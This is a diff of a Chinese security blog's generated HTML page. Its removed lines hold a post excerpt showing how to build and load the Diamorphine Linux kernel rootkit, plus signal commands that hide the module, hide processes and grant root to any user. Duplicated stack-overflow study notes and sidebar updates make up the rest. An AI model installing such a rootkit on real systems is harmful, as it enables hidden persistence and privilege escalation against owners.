-	</div>
-  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p>
-<p>编译安装:</p>
-<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
-cd Diamorphine
-make
-insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p>
-<pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块
-rmmod diamorphine   删除rootkit
-kill -64 0  从任意用户切换到root用户
-kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/07/05/stack.html" >栈溢出学习笔记</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-07-05  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p>
-<ol>
-<li>代码区：可执行指令</li>
-<li>数据区：用于存储全局变量</li>
-<li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li>
-<li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li>
-</ol>
-<p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p>
-<p>内存中的栈区指的就是系统栈，由系统自动维护。</p>
-<p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p>
-<ul>
-<li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li>
-<li>%ebp 指向栈的底部</li>
-<li>%eip 用来存储即将执行的程序指令的地址</li>
-<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
-<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
-</ul>
-<p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p>
-<ul>
-<li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li>
-<li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li>
-<li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li>
-<li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li>
-</ul>
-<p>栈操作（在32位下)：</p>
-<ul>
-<li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li>
-<li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p>
-<ol>
-<li>代码区：可执行指令</li>
-<li>数据区：用于存储全局变量</li>
-<li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li>
-<li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li>
-</ol>
-<p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p>
-<p>内存中的栈区指的就是系统栈，由系统自动维护。</p>
-<p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p>
-<ul>
-<li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li>
-<li>%ebp 指向栈的底部</li>
-<li>%eip 用来存储即将执行的程序指令的地址</li>
-<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
-<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
-</ul>
-<p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p>
-<ul>
-<li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li>
-<li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li>
-<li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li>
-<li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li>
-</ul>
-<p>栈操作（在32位下)：</p>
-<ul>
-<li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li>
-<li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -710,7 +580,7 @@ kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="l
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>46</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -731,23 +601,23 @@ kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="l
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>记一次钓鱼演练和OS X下的渗透技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Github搜索小技巧</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDI注入...</a>
+      </li>
+    
+      <li>
+        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>利用OpenResty进行域名流量劫持</a>
+      </li>
+    
+      <li>
         <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>支付接口安全测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/11/08/pve_homelab.html" ><i class="fa fa-file-o"></i>PVE使用注意事项</a>
-      </li>
-    
-      <li>
-        <a href="/2022/10/27/clickhouse-sql-inject.html" ><i class="fa fa-file-o"></i>ClickHouse注入测试记录</a>
-      </li>
-    
-      <li>
-        <a href="/2022/06/23/java-agent-shell.html" ><i class="fa fa-file-o"></i>Java安全笔记(4)-Java Agent</a>
-      </li>
-    
-      <li>
-        <a href="/2022/05/17/godzilla.html" ><i class="fa fa-file-o"></i>哥斯拉原理分析</a>
       </li>
     
   </ul>
